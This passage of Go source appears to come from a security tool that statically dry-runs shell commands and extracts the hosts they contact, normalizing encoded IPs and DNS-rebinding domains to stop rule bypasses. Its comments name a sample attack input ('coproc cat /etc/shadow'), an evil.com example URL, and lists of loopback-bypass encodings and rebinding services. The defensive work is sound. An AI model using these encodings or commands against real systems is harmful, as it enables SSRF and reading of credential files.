		case *syntax.CoprocClause:
			found = true
		case *syntax.ProcSubst:
			// Process substitution >(cmd) / <(cmd) creates FIFOs that the
			// interpreter tries to open. In dry-run mode these block forever
			// (nothing reads/writes the other end), causing hangs.
			found = true
			return false
		case *syntax.Redirect:
			// Interpreter only handles fd 0, 1, 2 (exact string match)
			if n.N != nil && n.N.Value != "" && n.N.Value != "0" && n.N.Value != "1" && n.N.Value != "2" {
				found = true
				return false
			}
			switch n.Op {
			case syntax.DplIn, syntax.DplOut:
				// The interpreter only supports a narrow subset of fd dup args
				// (e.g., ">&-" to close) and panics on valid fd numbers like
				// ">&0". Mark all fd dup redirects as unsafe.
				found = true
				return false
			case syntax.RdrOut, syntax.AppOut, syntax.RdrIn, syntax.WordHdoc:
				// Handled by the interpreter
			case syntax.Hdoc, syntax.DashHdoc:
				// Heredocs in pipe goroutines panic with "unhandled redirect
				// op: <<" because the interpreter's redir handler in goroutine
				// context doesn't support them. Skip interpreter for safety.
				found = true
				return false
			default:
				// Unhandled redirect operator (e.g., <> RdrAll) — would panic
				found = true
				return false
			}
		}
		return true
	})
	return found
}

// parseShellCommandsExpand parses a command string and runs it through the
// Runner. Thin wrapper over runShellFile for callers that have a raw string
// (e.g., recursive sh -c parsing).
func (e *Extractor) parseShellCommandsExpand(cmd string, parentSymtab map[string]string) ([]parsedCommand, map[string]string) {
	if e.worker != nil {
		resp, crashed := e.worker.eval(shellWorkerRequest{
			Cmd:          cmd,
			Env:          e.env,
			ParentSymtab: parentSymtab,
		})
		if crashed {
			return nil, maps.Clone(parentSymtab)
		}
		return resp.Commands, resp.Symtab
	}

	parser := syntax.NewParser(syntax.KeepComments(false), syntax.Variant(syntax.LangBash))
	file, err := parser.Parse(strings.NewReader(cmd), "")
	if err != nil {
		return nil, maps.Clone(parentSymtab)
	}
	syntax.Simplify(file)
	cmds, sym, _ := e.runShellFile(file, parentSymtab)
	return cmds, sym
}

// runShellFile runs a pre-parsed, simplified shell AST through interp.Runner
// in dry-run mode. The Runner handles variable tracking, assignment expansion,
// brace expansion, arithmetic, and quote removal natively.
//
// parentSymtab is merged for propagation across recursive sh -c parses.
// The Runner is seeded with e.env for real environment values (e.g., $HOME).
func (e *Extractor) runShellFile(file *syntax.File, parentSymtab map[string]string) (cmds []parsedCommand, sym map[string]string, panicked bool) {
	// Recover from panics in the shell interpreter. The mvdan.cc/sh runner
	// panics on unhandled AST nodes (e.g., CoprocClause). Without recovery,
	// an attacker could crash security analysis with "coproc cat /etc/shadow".
	defer func() {
		if r := recover(); r != nil {
			panicked = true
			if sym == nil {
				sym = maps.Clone(parentSymtab)
			}
		}
	}()

	// Pre-check: skip the interpreter for AST nodes it can't handle.
	// CoprocClause panics in mvdan.cc/sh v3.12.0, and if the coproc is
	// backgrounded, the panic occurs in an unrecoverable goroutine.
	if astHasUnsafe(file) {
		return nil, maps.Clone(parentSymtab), true
	}

	hasSubst := astHasSubst(file)
	env := buildRunnerEnv(e.env, parentSymtab)

	var commands []parsedCommand

	// Pending redirects buffer: OpenHandler fires BEFORE CallHandler per statement
	// (redirects are set up before the command runs), so we buffer redirect paths
	// and attach them when CallHandler creates the command.
	var pendingRedirOut, pendingRedirIn []string

	// mu protects commands and pendingRedir* from concurrent access.
	// The shell interpreter spawns goroutines for pipe subshells (e.g., cmd1 | cmd2),
	// which call our handlers concurrently.
	var mu sync.Mutex

	runner, err := interp.New(
		interp.Env(env),
		interp.StdIO(nil, io.Discard, io.Discard),
		// CallHandler captures ALL commands (builtins like echo/cd/true + externals).
		interp.CallHandler(func(ctx context.Context, args []string) ([]string, error) {
			if len(args) == 0 || args[0] == "" {
				return args, nil
			}
			mu.Lock()
			pc := parsedCommand{
				Name:     args[0],
				Args:     slices.Clone(args[1:]),
				HasSubst: hasSubst,
			}
			pc.RedirPaths = pendingRedirOut
			pc.RedirInPaths = pendingRedirIn
			pendingRedirOut = nil
			pendingRedirIn = nil
			commands = append(commands, pc)
			mu.Unlock()
			return args, nil
		}),
		// ExecHandler: prevent actual execution of external commands.
		interp.ExecHandlers(func(next interp.ExecHandlerFunc) interp.ExecHandlerFunc {
			return func(ctx context.Context, args []string) error {
				return nil
			}
		}),
		interp.OpenHandler(func(ctx context.Context, path string, flag int, perm os.FileMode) (io.ReadWriteCloser, error) {
			if path == "" {
				return nopCloser{}, nil
			}
			mu.Lock()
			if flag&(os.O_WRONLY|os.O_RDWR|os.O_APPEND|os.O_CREATE|os.O_TRUNC) != 0 {
				pendingRedirOut = append(pendingRedirOut, path)
			} else {
				pendingRedirIn = append(pendingRedirIn, path)
			}
			mu.Unlock()
			return nopCloser{}, nil
		}),
		interp.ReadDirHandler2(func(_ context.Context, _ string) ([]fs.DirEntry, error) {
			return nil, nil
		}),
		interp.StatHandler(func(_ context.Context, _ string, _ bool) (fs.FileInfo, error) {
			return nil, os.ErrNotExist
		}),
	)
	if err != nil {
		return nil, maps.Clone(parentSymtab), false
	}

	// Timeout prevents infinite loops (e.g., "while ;do a; done") from hanging
	// the extractor. 1 second is generous for static analysis dry-runs.
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()

	//nolint:errcheck // Run errors are expected (exit status, broken pipes, timeout)
	runner.Run(ctx, file)

	// Lock before reading commands: the interpreter may have spawned pipe-stage
	// goroutines that are still writing to commands after Run returns (e.g., on
	// context timeout or process substitution).
	mu.Lock()
	result := commands
	mu.Unlock()

	symtab := extractRunnerSymtab(runner)
	return result, symtab, false
}

// mergeEnvArgs extracts KEY=VALUE assignments from a command's arguments
// (e.g., from "env F=/path sh -c 'cat $F'") and merges them with a parent
// symtab. This allows variable references inside recursive shell parses to
// be resolved against env-style assignments from the outer command.
func mergeEnvArgs(args []string, parentSymtab map[string]string) map[string]string {
	merged := make(map[string]string)
	maps.Copy(merged, parentSymtab)
	for _, arg := range args {
		if k, v, ok := strings.Cut(arg, "="); ok && k != "" && !strings.HasPrefix(k, "-") {
			merged[k] = v
		}
	}
	return merged
}

// operationPriority returns the danger level of an operation for merging.
// Higher = more dangerous = takes precedence when merging multiple commands.
func operationPriority(op Operation) int {
	switch op {
	case OpDelete:
		return 6
	case OpWrite:
		return 5
	case OpCopy, OpMove:
		return 4
	case OpExecute:
		return 3
	case OpNetwork:
		return 2
	case OpRead:
		return 1
	default:
		return 0
	}
}

// extractHosts extracts hostnames/IPs from tokens (for network commands).
// All tokens are parsed through net/url for robust handling of schemes,
// ports, IPv6, userinfo, and other edge cases.
func extractHosts(tokens []string) []string {
	var hosts []string

	for _, token := range tokens {
		// Skip flags
		if strings.HasPrefix(token, "-") {
			continue
		}

		// Route everything through net/url by ensuring a scheme prefix.
		// This handles: "https://evil.com/path", "evil.com:8080/path",
		// "evil.com", "host:port", and bare hostnames uniformly.
		host := extractHostFromURL(token)
		if host != "" && looksLikeHost(host) {
			hosts = append(hosts, host)
		}
	}

	return hosts
}

// extractScpHost parses the user@host:path format used by scp/rsync.
// Returns the normalized host if found, or "" if the arg doesn't match the format.
func extractScpHost(arg string) string {
	if strings.HasPrefix(arg, "-") || arg == "" {
		return ""
	}
	colonIdx := strings.Index(arg, ":")
	if colonIdx <= 0 {
		return ""
	}
	hostPart := arg[:colonIdx]
	if atIdx := strings.LastIndex(hostPart, "@"); atIdx >= 0 {
		hostPart = hostPart[atIdx+1:]
	}
	hostLower := strings.ToLower(hostPart)
	if hostLower != "" && looksLikeHost(hostLower) {
		return normalizeIPHost(hostLower)
	}
	return ""
}

// extractHostFromURL extracts the host from a URL, normalizes it, and lowercases it.
// Uses net/url for robust parsing of edge cases (IPv6, userinfo, etc.).
// Normalizes hex (0x7f000001) and decimal (2130706433) IP representations to
// canonical dotted-quad form so rules match regardless of encoding.
// Hosts are lowercased because RFC 3986 §3.2.2 says host is case-insensitive.
func extractHostFromURL(rawURL string) string {
	// Ensure scheme so net/url can parse correctly
	if !strings.Contains(rawURL, "://") {
		rawURL = "http://" + rawURL
	}

	u, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}

	host := strings.ToLower(u.Hostname()) // strips port, handles [IPv6]
	return normalizeIPHost(host)
}

// normalizeIPHost converts non-standard IP representations to canonical form.
// Handles hex (0x7f000001) and decimal dword (2130706433) IP encodings used
// in SSRF bypasses. Only converts values that are clearly IP-like:
//   - Hex integers (0x prefix) — always intentional IP encoding
//   - Decimal integers > 16777215 (0xFFFFFF) — too large for a port/count,
//     must be a dword IP (covers all IPs ≥ 1.0.0.0)
//
// Returns the input unchanged for hostnames, small numbers, or standard IPs.
func normalizeIPHost(host string) string {
	// Already a standard IP (dotted-quad IPv4, IPv6)?
	// Unmap converts IPv6-mapped IPv4 (::ffff:127.0.0.1) to plain IPv4 (127.0.0.1)
	// so user rules matching "127.0.0.1" work regardless of IPv6 wrapping.
	if addr, err := netip.ParseAddr(host); err == nil {
		return addr.Unmap().String()
	}
	// Hex prefix (0x/0X) — always treat as IP encoding
	if strings.HasPrefix(host, "0x") || strings.HasPrefix(host, "0X") {
		if n, err := strconv.ParseUint(host, 0, 32); err == nil {
			return netip.AddrFrom4([4]byte{
				byte(n >> 24), byte(n >> 16), byte(n >> 8), byte(n), //nolint:gosec // intentional uint64→byte truncation for IP octet extraction
			}).String()
		}
	}
	// Large decimal — dword IP (skip small numbers like port 8080)
	if n, err := strconv.ParseUint(host, 10, 32); err == nil && n > 0xFFFFFF {
		return netip.AddrFrom4([4]byte{
			byte(n >> 24), byte(n >> 16), byte(n >> 8), byte(n), //nolint:gosec // intentional uint64→byte truncation for IP octet extraction
		}).String()
	}
	// Octal dotted-quad — e.g. 0177.0.0.1 = 127.0.0.1
	// Go's netip.ParseAddr rejects leading zeros, so we parse manually.
	// Only triggers when at least one octet has a leading zero (not "1.2.3.4").
	if parts := strings.Split(host, "."); len(parts) == 4 {
		hasLeadingZero := false
		var octets [4]byte
		valid := true
		for i, p := range parts {
			if p == "" {
				valid = false
				break
			}
			if len(p) > 1 && p[0] == '0' {
				hasLeadingZero = true
			}
			n, err := strconv.ParseUint(p, 0, 16) // base 0: auto-detect octal from "0" prefix
			if err != nil || n > 255 {
				valid = false
				break
			}
			octets[i] = byte(n)
		}
		if valid && hasLeadingZero {
			return netip.AddrFrom4(octets).String()
		}
	}
	// inet_aton short forms — e.g. 127.1 = 127.0.0.1, 127.0.1 = 127.0.0.1
	// 2-part: A.B where A is 8-bit, B is 24-bit
	// 3-part: A.B.C where A,B are 8-bit, C is 16-bit
	// curl/wget honor these on Linux; attackers use them to bypass loopback checks.
	if parts := strings.Split(host, "."); len(parts) >= 2 && len(parts) <= 3 {
		var octets [4]byte
		valid := true
		for i, p := range parts {
			if p == "" {
				valid = false
				break
			}
			var maxVal uint64
			if i < len(parts)-1 {
				maxVal = 255 // leading parts: 8-bit
			} else if len(parts) == 2 {
				maxVal = 0xFFFFFF // 2-part last: 24-bit
			} else {
				maxVal = 0xFFFF // 3-part last: 16-bit
			}
			n, err := strconv.ParseUint(p, 0, 32) // base 0: auto-detect hex/octal
			if err != nil || n > maxVal {
				valid = false
				break
			}
			if i < len(parts)-1 {
				octets[i] = byte(n) //nolint:gosec // n is validated ≤255 above; intentional uint64→byte for IP octet
			}
		}
		if valid {
			lastN, _ := strconv.ParseUint(parts[len(parts)-1], 0, 32) //nolint:errcheck // already validated in loop above
			if len(parts) == 2 {
				octets[1] = byte(lastN >> 16) //nolint:gosec // intentional uint64→byte truncation for IP octet extraction
				octets[2] = byte(lastN >> 8)  //nolint:gosec // intentional uint64→byte truncation for IP octet extraction
				octets[3] = byte(lastN)       //nolint:gosec // intentional uint64→byte truncation for IP octet extraction
			} else { // 3 parts
				octets[2] = byte(lastN >> 8) //nolint:gosec // intentional uint64→byte truncation for IP octet extraction
				octets[3] = byte(lastN)      //nolint:gosec // intentional uint64→byte truncation for IP octet extraction
			}
			return netip.AddrFrom4(octets).String()
		}
	}
	return host
}

// extractHostFromURLField extracts a host from a URL field value, handling both
// scheme-prefixed URLs ("https://evil.com/path") and scheme-less ("evil.com/path").
func extractHostFromURLField(s string) string {
	host := extractHostFromURL(s)
	if looksLikeHost(host) {
		return host
	}
	return ""
}

// rebindingSuffixes lists DNS rebinding services that resolve embedded IPs.
// e.g., 127.0.0.1.nip.io resolves to 127.0.0.1, A-B-C-D.sslip.io resolves to A.B.C.D.
var rebindingSuffixes = []string{".nip.io", ".sslip.io", ".xip.io"}

// rebindingExact lists domains that always resolve to 127.0.0.1.
var rebindingExact = map[string]string{
	"localtest.me":  "127.0.0.1",
	"lvh.me":        "127.0.0.1",
	"vcap.me":       "127.0.0.1",
	"lacolhost.com": "127.0.0.1",
}

// expandRebindingHosts checks each host for DNS rebinding patterns and adds
// the embedded/resolved IP alongside the original hostname. This allows
// IP-based host rules to catch rebinding bypasses like 127.0.0.1.nip.io.
func expandRebindingHosts(hosts []string) []string {
	var expanded []string
	for _, h := range hosts {
		expanded = append(expanded, h)
		// Check exact rebinding domains (and subdomains)
		for domain, ip := range rebindingExact {
			if h == domain || strings.HasSuffix(h, "."+domain) {
				expanded = append(expanded, ip)
				break
			}
		}
		// Check wildcard DNS rebinding services: extract embedded IP
		// Formats: A.B.C.D.nip.io or A-B-C-D.sslip.io
		for _, suffix := range rebindingSuffixes {
			if !strings.HasSuffix(h, suffix) {
				continue
			}
			prefix := h[:len(h)-len(suffix)]
			// Try dotted-quad format: 127.0.0.1.nip.io
			if ip := normalizeIPHost(prefix); ip != prefix || isStandardIP(prefix) {
				expanded = append(expanded, ip)
				break
			}
			// Try dash format: 127-0-0-1.sslip.io
			dashed := strings.ReplaceAll(prefix, "-", ".")
			if ip := normalizeIPHost(dashed); ip != dashed || isStandardIP(dashed) {
				expanded = append(expanded, ip)
				break
			}
		}
	}
	return expanded
}

// isStandardIP returns true if s is a valid dotted-quad IPv4 or IPv6 address.
func isStandardIP(s string) bool {
	_, err := netip.ParseAddr(s)
	return err == nil
}

// looksLikeHost checks if a string looks like a hostname or IP address
// using net/netip for IP validation and RFC-compliant hostname checking.
func looksLikeHost(s string) bool {
	if s == "" {
		return false
	}

	// Use net/netip for IP address detection (handles IPv4, IPv6, and
	// zone IDs correctly — unlike manual digit checking)
	if _, err := netip.ParseAddr(s); err == nil {
		return true
	}

	// Hostname: must contain a dot, only [a-zA-Z0-9.-], at least one letter
	if !strings.Contains(s, ".") {
		return false
	}
	hasLetter := false
	for _, c := range s {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') {
			hasLetter = true
		} else if c != '.' && c != '-' && (c < '0' || c > '9') {
			return false
		}
	}
	return hasLetter
}
